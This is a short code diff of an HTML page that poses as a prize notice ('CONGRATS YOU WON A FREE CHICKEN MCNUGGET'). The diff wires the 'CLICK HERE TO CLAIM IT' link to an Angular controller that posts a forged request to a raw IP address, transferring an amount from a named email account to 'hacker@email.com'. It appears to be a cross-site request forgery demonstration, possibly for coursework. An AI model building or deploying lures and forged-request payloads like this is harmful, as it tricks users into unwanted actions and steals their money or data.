@@ -5,19 +5,23 @@
     <title>WINNNNNNER!!!1!</title>
   </head>
   <body ng-app="app">
-    <h1>CONGRATS YOU WON A FREE CHICKEN MCNUGGET</h1>
+    <h1 ng-controller="callCtrl as call">CONGRATS YOU WON A FREE CHICKEN MCNUGGET</h1>
     <p>
-      <a href="#">CLICK HERE TO CLAIM IT</a>
+      <a ng-click="call.hack()">CLICK HERE TO CLAIM IT</a>
     </p>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.5.6/angular.min.js"></script>
     <script>
       angular.module('app', [])
 
         .controller('callCtrl', function($http) {
-          $http.post('107.170.122.176/send?amount=120&from=jdiep1@cpp.edu&to=hacker@email.com')
-            .then(function(res) {
-              console.log(res.data);
-            })
+          var vm = this;
+
+          vm.hack = function() {
+            $http.post('107.170.122.176/send?amount=120&from=jdiep1@cpp.edu&to=hacker@email.com')
+              .then(function(res) {
+                console.log(res.data);
+              })
+          };
         })
     </script>
   </body>
